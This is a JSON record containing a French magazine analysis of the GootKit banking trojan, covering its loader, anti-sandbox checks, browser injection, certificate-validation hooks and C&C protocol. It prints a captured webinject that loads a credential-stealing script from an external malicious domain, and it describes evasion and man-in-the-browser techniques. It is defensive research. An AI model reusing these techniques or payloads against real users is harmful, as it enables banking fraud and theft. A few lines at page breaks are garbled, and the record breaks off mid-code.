{
    "id": "c3276420-4650-4673-a4a1-63bd0f874e38",
    "created_at": "2023-01-12T15:05:38.506821Z",
    "updated_at": "2025-03-27T02:05:42.505423Z",
    "deleted_at": null,
    "sha1_hash": "a98b9d1187694211195e7c3fa82908292eb66dab",
    "title": "2018-11-01 - GootKit Analysis (French)",
    "authors": "",
    "file_creation_date": "2022-05-28T18:22:12Z",
    "file_modification_date": "2022-05-28T18:22:12Z",
    "file_size": 303386,
    "plain_text": "# Analyse du malware bancaire Gootkit et de ses mécanismes de protection\n\n**[connect.ed-diamond.com/MISC/MISC-100/Analyse-du-malware-bancaire-Gootkit-et-de-ses-mecanismes-de-protection](https://connect.ed-diamond.com/MISC/MISC-100/Analyse-du-malware-bancaire-Gootkit-et-de-ses-mecanismes-de-protection)**\n\nMISC\n\nn°\n100\n\nnovembre 2018\n\nPar\n[Rieunier Christophe](https://connect.ed-diamond.com/auteur/rieunier-christophe)\n[Dubier Thomas](https://connect.ed-diamond.com/auteur/dubier-thomas)\n[Malware](https://connect.ed-diamond.com/search/node?domains%5B0%5D=74477)\nTag(s)\n\n[Gootkit](https://connect.ed-diamond.com/search/node?tags%5B0%5D=73952)\nGootKit est un malware bancaire assez répandu depuis quelques années et présentant un certain nombre de caractéristiques intéressantes.\nSa payload principalement écrite en JavaScript a déjà fait l'objet d'un article dans votre magazine préféré [1]. Nous nous concentrerons ici sur\nl'écosystème local de GootKit et plus précisément sur son dropper ou plutôt son loader, en perpétuelle évolution dont l'architecture et les\nfonctionnalités méritent une étude détaillée.\n\nGootKit est principalement distribué via des campagnes de spams dont le mail contient un document malveillant. Le loader étudié ici provient\nd'un mail reçu en mai 2018. Le document Word reçu embarque une macro, laquelle télécharge un exécutable frmay.bin qu'elle dépose sur le\ndisque sous le nom de vmgtggu.exe. Dans cet article, nous étudierons principalement les fichiers suivants :\n\nloader vmgtggu.exe dont le condensat SHA1 est 1F47E816AF840A3AD44FAE28723E2064F12AA169. Le 23 mai 2018, son score\nVirusTotal était de 2 sur 65.\npayload téléchargée par le loader dont le condensat SHA1 une fois déchiffré et décompressé est\n**7A2B92005C5A6C28068CEDE9B8E2D7EFF29BE218. Une version identique dumpée depuis la mémoire présentait un score VirusTotal**\nde 4 sur 65 le 31 mai 2018.\n\n## 1. Écosystème local GootKit\n\nVu d'avion, l'écosystème local de GootKit est composé :\n\nd'un process loader en charge de la détection d'environnements hostiles (VM, sandbox, debuggers), de sa persistance, de sa propre\nmise à jour, de la récupération et des mises à jour de la payload et enfin, de l'instrumentation de tous les processus de navigateurs\ninternet pour faciliter le travail de la payload ;\nd'un second process de loader en charge de l'exécution de la payload sous forme d'une DLL (dans certaines versions et selon le\ncontexte d'exécution ce process peut être une instance de svchost par exemple ou un service) ;\nde code injecté dans chaque instance de processus de navigateur internet permettant de router le trafic non encore chiffré vers la\npayload et inversement ;\ndu code de la payload permettant de réaliser un grand nombre d'actions sur le PC de la victime, et notamment de voler les identifiants de\nla victime et de modifier les échanges avec les applications bancaires ciblées.\n\nLa figure 1 présente les différentes briques composant l'écosystème local de GootKit.\n\nFigure 1\n\n\n-----\n\n## 2. Le loader\n\nComme on peut le constater sur l'illustration précédente, le loader est un exécutable PE 32 bits composé de différents threads spécialisés dont\nles fonctions sont détaillées ci-dessous.\n\n### 2.1 Protections\n\nLe loader est packé, ce qui lui permet de contourner temporairement les anti-virus. Le fonctionnement du packer est très classique :\nl'exécutable contient un chargeur chiffré ainsi que le code du loader chiffré. Le packer déchiffre le chargeur, lequel se contente de déchiffrer\n« proprement » le vrai code du loader in situ, puis de lui passer la main. Quelques fonctions de détections de sandbox sont appelées par le\nchargeur, mais celles-ci se limitent à un sous-ensemble des contrôles effectués par le code du loader déchiffré et détaillés ci-dessous.\n\nLe code du loader déchiffré contient peu de protections anti-debug ou destinées à freiner une analyse manuelle. Toutes les protections\nsemblent destinées à éviter les détections par les anti-virus et les analyses par des sandbox.\n\n**2.1.1 Mesures anti-analyse et anti-détection**\n\nLa seule mesure anti-debug appliquée par le loader consiste à regarder si la DLL dbghelp.dll est chargée. Cette DLL Microsoft fournit un\ncertain nombre de fonctionnalités utiles aux debuggers et notamment à WinDbg.\n\nToutes les chaînes de caractères du loader sont obfusquées via un simple xor, mais la valeur de la clé est différente pour chaque chaîne et sa\nlongueur varie. De plus, le code de déchiffrement est dupliqué pour chaque chaîne. Un script IDA par exemple permet de déchiffrer toutes les\nchaînes et de simplifier l'étude du loader.\n\nLe loader ne semble pas apprécier Avast : il entre en effet dans une boucle infinie s’il détecte la présence de la DLL snxhk. Dans des versions\nultérieures, ce contrôle est remplacé par la recherche de la chaîne \\Avast\\defs\\ directement en mémoire, laquelle correspond au nom du\nsous-répertoire d'Avast contenant les définitions de virus.\n\nDe plus, afin d'essayer de masquer une partie de ses actions, le loader « dé-hooke » les API Windows « sensibles » généralement détournées\npar les anti-virus (NtWriteVirtualMemory, NtMapViewOfSection, NtResumeThread...). Pour ce faire, il restaure les cinq premiers octets de\nleur code depuis le code original lu dans la DLL système correspondante chargée depuis le disque. Il écrase ainsi d'éventuels hooks posés\navant son exécution.\n\nEnfin, on notera que le loader utilise un générateur de nombres aléatoires de type MersenneTwister.\n\n**2.1.2 Mesures anti-VM et sandbox**\n\nOutre les mesures anti-analyse et anti-détection, le loader applique les techniques suivantes pour essayer de détecter plusieurs sandbox :\n\nil regarde si la DLL sbiedll.dll est chargée pour détecter sandboxie ;\nil regarde si le username est « CurrentUser » ou « Sandbox » ou « xqnuwino » ;\nil regarde si le computername est « 7SILVIA » ou « SANDBOX » ;\nil regarde si HKLM\\HARDWARE\\DESCRIPTION\\System\\SystemBiosVersion contient « AMI », « BOCHS » (BOCHS PC Emulator),\n« VBOX » (VirtualBox), « QEMU », « SMCI », « INTEL - 6040000 » (VMware), « FTNT-1 » (Fortinet) ou « SONI » ;\nil regarde si HKLM\\HARDWARE\\DESCRIPTION\\System\\SystemBiosVersion contient VirtualBox ;\nil regarde si HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion contient une des trois valeurs « 55274-640-2673064-23950 »,\n« 76487-644-3177037-23510 » ou « 76487-337-8429955-22614 » qui correspondent respectivement à JoeSandbox, CWSandbox et\nAnubis.\n\nCertaines de ces mesures sont encore efficaces, par exemple vis-à-vis d'un VirtualBox non modifié. Par contre, certaines autres montrent que\nce code est ancien, car la sandbox Anubis par exemple n'existe plus. On retrouve d'ailleurs des fonctions identiques dans d'autres souches de\nlogiciels malveillants.\n\nDans le cas où une sandbox est détectée, le loader simule un bug destiné à leurrer la sandbox en réalisant en boucle des appels à\n**GetProcAddress de l'API UuidCreateSequential, mais en envoyant un handle de module à NULL.**\n\nEnfin, le loader contrôle le nom de son exécutable à l'aide d'une table de CRC32 de noms convertis en majuscules. Si celui-ci correspond à\n**SAMPLE.EXE, SANDBOX.EXE, MALWARE.EXE, TEST.EXE, BOT.EXE, KLAVME.EXE, MYAPP.EXE ou TESTAPP.EXE, il se termine et**\nessaie de supprimer l'exécutable correspondant.\n\nUne fois l'environnement d'exécution contrôlé, pour éviter toute surinfection le loader crée classiquement un mutex. Celui-ci est nommé\n**ServiceEntryPointThread.**\n\n**2.1.3 Bypass des protections & logs**\n\nDétail amusant, la plupart des protections anti-VM et sandbox peuvent être contournées via la déclaration d'une variable d'environnement\nrépondant au doux nom de crackmeololo. Si le CRC32 du contenu de cette variable d'environnement est égal à 0x964B360E, alors les\ncontrôles en question ne sont pas effectués.\n\n\n-----\n\ne dé e oppeu du oade a auss p s e so de ogue u ce ta o b e d o at o s da s a co so e de debug ou passe ape çus\n(sic!), tous les messages font référence à un logiciel type player MP3. Ainsi, la chaîne WMA 0 est loguée à l'entrée du thread de contrôle et de\nmise à jour de la payload, la chaîne WMA 1 indique que la payload a été mise à jour, la chaîne WMA 2 signale que la payload n'a pas été\nmise à jour, tandis que la chaîne MP3 File Corrupted signale le lancement du thread principal d'installation.\n\n### 2.2 Persistance\n\nPour assurer sa persistance, le loader crée une « pending GPO » qui sera exécutée lors de la prochaine ouverture de session de l'utilisateur. Il\ncrée un fichier .inf dont la section [DefaultInstall] lance le loader via la commande RunPreSetupCommands, puis crée les clés de registre\npermettant d'exécuter cette GPO sous HKCU\\Software\\Microsoft\\IEAK\\GroupPolicy\\PendingGPOs.\n\n### 2.3 Configuration\n\nLa configuration du loader contient dix entrées de 32 octets destinées à stocker les noms de domaines des serveurs de commande et contrôle\n(C&C), ainsi qu'un numéro de version et le nom du process hôte de la payload dans le cas où le loader dispose des droits LOCAL_SYSTEM.\n\nLa configuration est chiffrée avec le même algorithme que celui utilisé pour chiffrer la payload. Le loader injecte une copie de la configuration\ndans la payload lorsqu'il la charge, juste après le marqueur DDDD.\n\nIl n'existe pas de fonction de mise à jour de la configuration et donc des adresses des C&C. La mise à jour de la configuration passe toujours\npar une mise à jour complète du loader.\n\n### 2.4 Gestion des mises à jour\n\nLors de l'écriture de cet article, une fréquence de mise à jour du loader de l'ordre d'une version quotidienne a pu être observée, sauf au mois\nd'août (sic !). La payload quant à elle semble mise à jour beaucoup moins souvent.\n\n**2.4.1 Mise à jour du loader**\n\nToutes les dix minutes, le thread 4 du loader, dédié à la gestion de ses mises à jour calcule le CRC de l'exécutable en cours puis appelle son\nC&C via un GET /rpersist4/<résultat du CRC en décimal signé>. S’il s'agit de la dernière version du loader, le serveur répond avec un code\nHTTP 504. Dans le cas où une nouvelle version du loader est disponible, le serveur la renvoie simplement, non chiffrée, avec un code 200. Le\nloader vérifie qu'il s'agit bien d'un PE, puis l'écrit sur le disque avec une extension .update afin de le lancer avec le switch -test. Il vérifie alors\nque celui-ci renvoie un code retour égal à 0x4DF. Si c'est bien le cas, il lance le thread 11 qui va tuer tous les threads en cours, tuer le process\nhôte de la payload, supprimer la variable d'environnement msiexec si elle existe et enfin terminer le processus en cours en ayant\npréalablement lancé un cmd /c ping localhost -n 4 & del /F /Q \"<nom_du_loader.exe>\" & move /Y \"<nom_du_loader.update>\" \"\n**<nom_du_loader.exe>\" > nul & \"<nom_du_loader.exe\" destiné à remplacer le loader par sa nouvelle version et la relancer dans la foulée.**\n\n**2.4.2 Récupération et mise à jour de la payload « fileless »**\n\nLa payload est stockée dans le registre sous HKCU\\Software\\AppDataLow au sein de valeurs dont le nom est généré aléatoirement et\ncomposé d'extraits de noms d'exécutables systèmes suivi d'un indice numérique. Elle est stockée sous forme chiffrée et compressée.\n\nUn autre thread est dédié à la gestion de la payload. Si une payload est stockée dans le registre, il la déchiffre et la décompresse via l'API\n**RtlDecompressBuffer puis tant qu'un suicide n'est pas amorcé, le thread va requêter le C&C avec un GET /rbody320 qui va lui renvoyer le**\nCRC de la dernière version de la payload en binaire sur quatre octets. Si une nouvelle version est disponible ou qu'aucune payload n'est\nstockée dans le registre, une ou plusieurs requêtes GET /rbody32 seront envoyées éventuellement avec un en-tête RANGE: pour découper\nle transfert. La payload téléchargée est chiffrée et compressée. Elle contient un header de douze octets indiquant la taille totale de la payload,\nla taille des données décompressées et la taille des données compressées. La nouvelle payload est déchiffrée et décompressée à des fins de\ncontrôle, puis elle est stockée dans le registre à la place de la précédente. Un sleep d'une durée aléatoire est alors effectué avant de requêter\nà nouveau le C&C.\n\nOn notera que la payload n'est jamais écrite sur disque.\n\n### 2.5 Échange d'informations entre loader et payload\n\nPlusieurs variables d'environnement sont utilisées pour communiquer entre le loader et la payload :\n\n**USERNAME_REQUIRED est fixée à TRUE si le loader est lancé avec --service ;**\n**USERNAME est fixée avec le nom de l'utilisateur courant. Si le loader est lancé en tant que service, le nom d’utilisateur est concaténé**\navec le guid du bot pour pouvoir gérer plusieurs utilisateurs sur une même machine ;\n**standalonemtm est fixée à true. Cette variable n’est jamais utilisée dans la payload. Elle provient probablement d’une ancienne version**\ndu loader ;\n**vendorid est fixée à exe_scheduler_<N°port de la configuration>. La variable est récupérée par la payload pour compléter les**\ninformations d’enregistrement ;\n**mainprocessoverride est fixée à N. La variable d’environnement est probablement utilisée par une ancienne version ;**\n**RandomListenPortBase est fixée avec la valeur 100. Elle définit les ports d’écoute des proxys HTTP et HTTPS mis en place par la**\npayload.\n\n\n-----\n\n### 6 o ut o s du oade\n\nLe loader est en perpétuelle évolution au vu des différences observées dans son code au fil des versions successives : apparition de switchs **-service, --client, --server, --reinstall, disparition du switch --pqrst...**\n\nLes différentes versions analysées montrent que l'auteur ne semble pas utiliser de gestionnaire de version : le code des évolutions non\nachevées (par exemple, les fonctionnalités correspondant aux switchs --client, --server) est embarqué dans les différentes versions\nsuccessives, certaines parties de code sont parfois dupliquées ou sautées par ajout de paramètres à valeur fixe.\n\nLes versions récentes du loader permettent une installation de celui-ci en tant que service et contiennent une fonctionnalité de réinstallation\ncomplète via le switch --reinstall.\n\n### 2.7 Kill Switch ou scorie d'ancienne méthode de persistance ?\n\nLe thread 7 du loader ressemble fortement à un kill switch : il cherche en permanence à effacer un fichier nommé uqjckehuhl.tmp dans les\ndifférents répertoires temporaires. Lorsqu'il le trouve, il termine tous les threads en cours, supprime l'exécutable loader sur le disque, nettoie\nles répertoires temporaires de tous les profils d'utilisateurs ainsi que celui du système et force un reboot. Cependant, il n'efface pas la payload\ndu registre et conserve la tâche programmée mise en place si l'exécutable qu'elle lance est présent (certaines versions plus anciennes du\nloader assuraient la persistance via une tâche programmée).\n\nL'intention réelle de l'auteur n'est pas claire. Cependant, dans les versions du loader étudiées, ce thread correspond bien à un kill-switch.\n\n## 3. Man in the middle via les navigateurs\n\nPour pouvoir intercepter et modifier les échanges réalisés entre la victime et le site de sa banque, le loader injecte une DLL dans chaque\nprocessus de navigateur internet. Le thread 5 du loader énumère en permanence les processus et détecte ainsi tout lancement de processus\n**CHROME.EXE, FIREFOX.EXE, IEXPLORE.EXE, MICROSOFTEDGE.EXE, MICROSOFTEDGECP.EXE, OPERA.EXE ou SAFARI.EXE.**\nDans le cas de Chrome, seul le processus père est injecté.\n\nPour chaque processus injecté, un Atom est créé avec pour valeur la concaténation du PID du processus injecté et du timestamp de création\ndu process obtenu par un appel à GetProcessTimes.\n\nPar ailleurs, le loader désactive via un thread dédié le mode protégé d'Internet Explorer pour toutes les zones de sécurité.\n\n### 3.1 Injection de code au sein du navigateur\n\nDans les premières versions étudiées du loader, la DLL est injectée dans les navigateurs en utilisant la technique classique « Reflective DLL ».\nLe loader crée une section mémoire via NtCreateSection qu’il « mappe » dans le processus cible grâce à l’appel système\n**NtMapViewOfSection. Puis le loader copie la DLL en mémoire et applique les relocalisations selon l’adresse de la vue dans le processus**\ncible.\n\nEnsuite, le code malveillant initialise des structures (figure 2) après la DLL qui seront utilisées par le chargeur.\n\nFigure 2\n\nLe chargeur est un bout de code en 32 ou 64 bits (selon le processus) qui permet de résoudre la table d’imports et d’appliquer les\ncaractéristiques des sections de la DLL. Pour ce faire, il utilise les trois fonctions ZwVirtualProtectMemory, LdrLoadDll et\n**LdrGetProcedureAddress.**\n\n\n-----\n\neu s ad esses so t éso ues et sc tes pa e oade da s u e st uctu e p acée juste à a de age de a e é o e Co e e\nchargeur ne sait pas où il a été chargé, d’autres informations utiles sont renseignées dans cette structure comme l’adresse de la vue ou\nencore le contenu de la DLL sous ses deux versions.\n\nUne zone de données est réservée au chargeur. Elle est utilisée pour convertir en Unicode les noms des dépendances utilisées par la DLL,\ncar la fonction LdrLoadDll n’accepte qu’un pointeur vers une structure UNICODE_STRING.\n\nPour terminer, le loader déclenche l’exécution du chargeur via un appel à RtlCreateRemoteThread. Dans le cas où le processus à injecter est\nen 64 bits, le dropper utilise une heaven gate pour appeler la version 64 bits de l’API RtlCreateRemoteThread. On notera que le thread ne\ncommence pas directement sur la page mémoire contenant le chargeur, mais sur une autre page contenant une instruction jmp vers le\nchargeur. Il s'agit d'une technique permettant de contourner certains antivirus qui scanneraient la page au moment de la création d’un thread\npar un autre processus. Autre point intéressant : lorsque le loader a besoin d’écrire dans l’espace d’adressage du processus cible, celui-ci\nn’écrit qu’un seul octet à la fois via WriteProcessMemory, c’est une technique d’évasion.\n\nLes nouvelles versions du loader ont remplacé l’appel RtlCreateRemoteThread par un hook de l'API TranlsateMessage pour plus de\ndiscrétion vis-à-vis des antivirus.\n\n**TranslateMessage étant appelé par tous les processus gérant les évènements issus du clavier, le malware redirige ainsi le flux d’exécution du**\nprocessus cible vers un bout de code qui s'occupe de lancer le « chargeur » dans un nouveau thread beaucoup plus discrètement.\n\nEn 64 bits c’est la fonction ZwClose qui est hookée. Elle est appelée par CloseHandle qui est très souvent utilisée dans un programme\nWindows.\n\nHeavens Gate est une technique permettant d’appeler du code 64 bits depuis un processus 32 bits.\n\nL’auteur de ce malware utilise cette technique « Heavens Gate » pour appeler la version 64 bits de l’API RtlCreateRemoteThread. Vous vous\ndemandez certainement comment cela est possible ? La réponse réside dans le fonctionnement des processeurs Intel et le cœur du système\nd’exploitation.\n\nPour adresser la mémoire, un processeur x86 utilise une adresse logique, qu’il transforme ensuite en adresse linéaire ou virtuelle, laquelle\npermettra d’obtenir une adresse physique via le mécanisme de pagination lorsqu'il est activé (ce qui est toujours le cas sous Windows).\n\nUne adresse logique est constituée en 32 bits d’un sélecteur contenu dans un registre de segment (CS, DS, ES, SS, FS, GS) et d’un offset. Le\nsélecteur permet au CPU de retrouver le descripteur du segment mémoire à adresser dans la Global Descriptor Table (GDT) ou dans la Local\n_Descriptor Table (LDT)._\n\nUn sélecteur est constitué de 16 bits, le bit 2 indique si ce sélecteur référence la LDT ou la GDT et les bits 3 à 15 indiquent l’entrée de la LDT\nou de la GDT à utiliser.\n\nLe descripteur référencé par le sélecteur contient un certain nombre d’attributs décrivant la zone mémoire concernée, dont notamment son\nadresse linéaire de base et sa taille ou limite, ainsi qu’un bit L indiquant la présence de code 64 bits dans le segment.\n\nOn notera au passage que les registres de segment contiennent une partie cachée et inaccessible servant à mettre en cache les\ncaractéristiques du descripteur pointé par le sélecteur actuellement chargé dans le registre. Ceci pour éviter au CPU d’aller relire la LDT ou\nGDT à chaque utilisation d’un registre de segment.\n\nWindows comme la plupart des systèmes d’exploitation modernes fonctionne en mode dit « flat ». Afin de favoriser les performances, il limite\nvolontairement le nombre de segments mémoire, évitant ainsi autant que faire se peut les opérations coûteuses de rechargement des parties\ncachées des registres de segment. La GDT est donc utilisée uniquement pour isoler le kernel qui tourne en ring 0 des processus utilisateurs\nqui tournent en ring 3. Les processus utilisateurs sont isolés les uns des autres via un artifice consistant à attribuer un catalogue de pages\ndistinct à chacun d'entre eux, ce qui permet de fournir le même espace virtuel à chaque processus, mais mappé sur des espaces physiques\ndifférents. Ces espaces sont swappés à chaque changement de tâche via la modification du registre CR3, laquelle est peu coûteuse en CPU.\n\nDans un environnement 64 bits, par exemple sous Windows10, la GDT contient les descripteurs suivants :\n\n**Id** **Description**\n\n0 Descripteur NULL destiné à capter les cas où un registre de segment contiendrait un sélecteur à 0\n\n2 Ring 0 (kernel) 64 bits Code\n\n3 Ring 0 (kernel) Data\n\n**4** **Ring 3 (userland) Compatibility Mode Code 32 bits**\n\n\n-----\n\n5 Ring 3 (userland) Data\n\n**6** **Ring 3 (userland) Code 64 bits**\n\n8 Ring 0 (kernel) 32 bits TSS\n\n10 Ring 3 (userland) Compatibility Mode TEB\n\n12 Ring 0 (kernel) code\n\nPar défaut, Windows n’utilise pas la LDT, dont on rappellera qu'il peut en exister une par process, chaque LDT étant désignée par un\ndescripteur dans la GDT.\n\nLorsque l’unité de gestion mémoire doit traduire une adresse logique en une adresse linéaire, celle-ci utilise donc le sélecteur contenu dans le\nregistre de segment pour retrouver les caractéristiques du segment dans la GDT ou la LDT.\n\nLorsqu’il s’agit d’exécuter du code, le CPU utilise le couple de registres CS:EIP pour récupérer l’instruction à exécuter. Les bits 3 à 15 du\nregistre CS permettent de sélectionner un descripteur de segment dans la GDT ou la LDT. La 4ième et la 6ième entrée de la GDT de Windows\ncontiennent un descripteur de segment de code utilisateur. La différence, le bit L est à 1 sur la 6ième entrée, cela correspond donc à un\nsegment de code 64 bits. Ainsi, en modifiant la valeur du registre CS de 0x23 à 0x33 ou l’inverse, on peut alterner entre les modes 32 et IA32e\ndu CPU. Le segment CS n’étant pas manipulable directement, l’auteur du malware utilise l’instruction retf (return far). Cette instruction dépile\ndans un premier temps 4 octets de la pile dans le registre EIP, puis dépile dans un second temps le sélecteur qui sera placé dans le registre\nde segment CS.\n\nL'extrait de code suivant montre l'appel au code 64 bits depuis le code 32 bits :\n\nFigure 3\n\nOn notera que Windows lui-même utilise cette méthode lors des appels systèmes réalisés depuis un processus 32 bits dans la WoW via les\nAPI non documentées Wow64SystemServiceCall ou KiFastSystemCall.\n\n### 3.2 Redirection du trafic\n\nUne fois injectée, la DLL va changer la façon dont le navigateur se connecte à Internet. En utilisant l’API WSAIoctl et le code de contrôle I/O\n**SIO_GET_EXTENSION_FUNCTION_POINTER, le code malveillant récupère l'adresse de la fonction ConnectEx et installe un hook sur celle-**\nci. Cette fonction fait le lien entre la partie user-land et kernel-land qui se charge d’établir une connexion réseau. En interceptant cette fonction,\nle code malveillant pourra modifier la connexion, quelle que soit l’API de plus haut niveau utilisée :\n\nBOOL LpfnConnectex(\n\nSOCKET s,\n\nconst sockaddr *name,\n\nint namelen,\n\nPVOID lpSendBuffer,\n\nDWORD dwSendDataLength,\n\nLPDWORD lpdwBytesSent,\n\n\n-----\n\nO pO e apped\n\n)\n\nLa fonction de remplacement modifie la structure name avant de transférer le contrôle à la véritable fonction ConnectEx. Si la famille\nd’adresse est AF_INET alors name est de type sockaddr_in et contient l’adresse et le port du point de terminaison auxquels doit se\nconnecter le socket.\n\nL’adresse de connexion est remplacée par 127.0.0.1, le numéro de port est défini selon les variables d’environnement httpsPortOverride et\n**httpPortOverride. Si celles-ci n’existent pas, le port est incrémenté de 100. Cela coïncide avec la variable d’environnement**\n**RandomListenPortBase définie par le loader pour la payload.**\n\nPour ne pas éveiller les soupçons de l’utilisateur, l’auteur a pris soin de ne pas déclencher les messages d’avertissement lors d’une connexion\nsécurisée SSL. Pour ce faire, la DLL hooke deux fonctions supplémentaires. Dans un premier temps, la fonction\n**CertVerifyCertificateChainPolicy présentée ci-dessous est détournée :**\n\nBOOL CertVerifyCertificateChainPolicy(\n\nLPCSTR pszPolicyOID,\n\nPCCERT_CHAIN_CONTEXT pChainContext,\n\nPCERT_CHAIN_POLICY_PARA pPolicyPara,\n\nPCERT_CHAIN_POLICY_STATUS pPolicyStatus\n\n);\n\nElle a pour but de vérifier la validité d’une chaîne de certificats selon la politique spécifiée par le paramètre pszPolicyOID . Si la chaîne de\ncertificats est validée alors la fonction met à zéro le membre dwError de la structure pointée par pPolicyStatus et renvoie TRUE.\n\nLe code malveillant de remplacement renvoie directement TRUE et met à zéro le membre dwError de pPolicyStatus sans appeler la\nvéritable fonction.\n\nLa deuxième fonction interceptée est CertGetCertificateChain, dont voici le prototype :\n\nBOOL CertGetCertificateChain(\n\nHCERTCHAINENGINE hChainEngine,\n\nPCCERT_CONTEXT pCertContext,\n\nLPFILETIME pTime,\n\nHCERTSTORE hAdditionalStore,\n\nPCERT_CHAIN_PARA pChainPara,\n\nDWORD dwFlags,\n\nLPVOID pvReserved,\n\nPCCERT_CHAIN_CONTEXT *ppChainContext\n\n);\n\nElle permet de construire la chaîne de certificats qui valide le certificat donné pCertContext. Si le certificat n’est pas lié à un certificat racine\nalors le membre dwErrorStatus de la structure TrustStatus du paramètre de retour pChainContext contient la valeur\n**CERT_TRUST_IS_UNTRUSTED_ROOT. Dès que le dwErrorStatus est différent de 0, le navigateur alerte l’utilisateur.**\n\nLa fonction de remplacement construit une fausse chaîne de certificats en prenant bien soin de mettre à zéro le membre dwErrorStatus, ainsi\nle navigateur croit avoir affaire à un certificat valide et approuvé.\n\n## 4. Payload\n\nLa payload finale est une version du cheval de Troie bancaire dénommée GootKit. Ce malware écrit en Node.js cible entre autres les banques\nfrançaises depuis 2014. Le code JavaScript est compressé, chiffré par l’algorithme RC4 et embarqué dans un exécutable. Nous n'aborderons\npas la phase d'unpacking qui a déjà été traitée dans l’article MISC « Analyse d’un malware en nodeJS » [1]. Le malware reprend les\nfonctionnalités de Zeus dont la principale fonction consiste à injecter du JavaScript dans les pages web visitées par l’utilisateur afin de profiter\nde sa session pour voler ses identifiants. Les webinjects sont capables de modifier le solde du compte et la liste des bénéficiaires sur la page\npour que la fraude passe inaperçue\n\n\n-----\n\nco p é e t, a pay oad est capab e de\n\ncollecter les mots de passe des navigateurs Chrome et Firefox ainsi que ceux stockés dans le Windows Protected Storage ;\ntélécharger des fichiers vers le serveur ou le client ;\ncapturer l’écran et le clavier ;\nexécuter des commandes en provenance du C&C ;\ncréer un proxy pour l’attaquant.\n\nGootKit initie une connexion sécurisée avec un des C&C inscrits dans la configuration. Une fois la connexion établie, le trojan attend les ordres\ndu C&C. La communication étant chiffrée, la configuration finale est difficilement interceptable, de plus le malware détecte les environnements\nvirtuels. Heureusement, l’auteur a intégré un contournement probablement à des fins de tests. La variable d’environnement trustedcomp\nfixée à true permet de contourner les tests anti-vm de la payload de GootKit. On notera aussi que la variable d’environnement\n**dump_debug_to_file à true permet d’activer la fonctionnalité de journalisation dans un fichier.**\n\nUne fois lancé dans une VM avec les bonnes variables d’environnements, le malware récupère sa configuration et l’enregistre chiffrée dans la\nclef de registre HKCU\\Software\\Microsoft sous le nom {102f49a9-80c9-42ee-8924-3256738fc621}.\n\nPour déchiffrer la configuration, il est possible de reverser l'algorithme de chiffrement, mais nous avons choisi une méthode plus rapide\nconsistant à émuler la fonction de chiffrement/déchiffrement avec la bibliothèque Unicorn **[2]. La configuration fonctionnelle est au format**\n**Protobuf. Elle contient la liste des sites ciblés (volontairement masqués ci-dessous) et le code JavaScript qui doit être injecté sur chaque**\npage. Voici ci-dessous un extrait de la configuration :\n\nMessage {\nbase:\nMessage {\nurl:\n[ 'https://xxxxxxxxxxx.xxxxxxxxxx/xx*',\n'https://yyyyyyyy.yyyyyyyyyy/xx*',\n'https://zzzzzzzzzzzzzz.zzzzzzzzzz/xx*' ],\nenabled: true,\nguids: [],\nfilt_get: true,\n\nfilt_post: true,\n\n},\ndata_before: '<html*<head*>',\ndata_inject: '<div id=\"_brows.cap\" style=\"position:fixed;top:0px;left:0px;width:100%;height:100%;z-index:9999;background:#ffffff;\">\n</div>\\n<script>\\nvar _0x2f90=\n\n[\"\",\"\\\\x64\\\\x6F\\\\x6E\\\\x65\",\"\\\\x63\\\\x61\\\\x6C\\\\x6C\\\\x65\\\\x65\",\"\\\\x73\\\\x63\\\\x72\\\\x69\\\\x70\\\\x74\",\"\\\\x63\\\\x72\\\\x65\\\\x61\\\\x74\\\\x65\\\\x45\\\\x6C\\\\x65\\\\x6D\\\\x65\\\\x\n\n[...]\n\n};} ());\n\n_brows=Browser;\\n_brows.botid = \\'%BOTID%\\';\n\n_brows.inject(\"https://maprivevente.com/ZZko9i92u8w8271/menu.php?j=bp\");\n\n</script>',\ndata_after: '',\n\nstoplist: [] }\n\nCe code injecte un deuxième code situé sur un site externe permettant de voler les identifiants de l’utilisateur, mais aussi modifier le solde du\ncompte ainsi que l’historique et la liste des bénéficiaires affichés côté utilisateur.\n\n## 5. Automatisation de la récupération des configurations\n\nAfin de pouvoir contrer les actions de Gootkit, il est intéressant de surveiller ses évolutions.\n\n### 5.1 Récupération des nouvelles versions de loader et de payload\n\nLes échanges avec le serveur pour la récupération des nouvelles versions du loader et de la payload étant extrêmement simples, un script\nPython minimaliste permet :\n\npour le loader d'envoyer la requête de détection et téléchargement de nouvelle version, calculer le CRC32 de l'éventuelle version reçue\net boucler toutes les dix minutes ;\n\n\n-----\n\npou a pay oad d e oye a equête de co t ô e de de è e e s o, pu s s u e ou e e e s o est d spo b e, e oye a equête de\nrécupération, puis déchiffrer et décompresser la nouvelle payload.\n\n### 5.2 Récupération de la configuration technique\n\nLa configuration technique est extraite du loader par un script Python instrumentant celui-ci à l'aide de l'excellente librairie pydbg **[3]. Le**\nprincipe consiste à laisser le loader se dépacker, puis à récupérer l'adresse de la configuration chiffrée en mémoire via la recherche de\nsignature d'appel au code de déchiffrement. Enfin, la configuration est déchiffrée avec le même code que celui utilisé pour déchiffrer la\npayload à l'étape précédente et le loader déchiffré est dumpé sur disque.\n\nCette étape permet de récupérer d'éventuelles nouvelles adresses de C&C et d'alimenter un travail de suivi des évolutions du loader, et en\ncombinaison avec l'étape précédente, de la payload.\n\n### 5.3 Récupération de la configuration fonctionnelle\n\nEn utilisant le code JavaScript du malware, il est possible de récréer un bot en supprimant ses fonctionnalités malveillantes. Le C&C envoie\nrégulièrement des paquets ping auxquels il faut répondre pour recevoir d’autres paquets. Après le premier ping, un paquet de demande\nd’enregistrement est envoyé. Le bot doit générer un guid et envoyer des informations complémentaires sur la machine :\n\nfunction GenerateBotInfo(){\n\nprocess.GetMachineGuid();\n\nif(!process.cpus){\n\nprocess.cpus = os.cpus();\n\n}\n\nprocess.bot = {\n\n'processName': process.execPath,\n\n'guid': process.machineGuid,\n\n'vendor': process.g_vendorName,\n\n'os': util.format(\"%s %s (%s)\", os.type(), os.release(), os.arch()),\n\n'ie': getIeVersion(),\n\n'ver': util.format(\"%s.%s\", process.version, process.g_botId),\n\n'handler': '/registrator',\n\n'uptime': os.uptime(),\n\n'upspeed': 0,\n\n'internalAddress': process.externalAddress,\n\n'HomePath': process.env['HOMEPATH'],\n\n'ComputerName': process.env['COMPUTERNAME'],\n\n'SystemDrive': process.env['SystemDrive'],\n\n'SystemRoot': process.env['SystemRoot'],\n\n'UserDomain': process.env['USERDOMAIN'],\n\n'UserName': process.env['USERNAME'],\n\n'UserProfile': process.env['USERPROFILE'],\n\n'LogonServer': process.env['LOGONSERVER'],\n\n'freemem': os.freemem(),\n\n'totalmem': 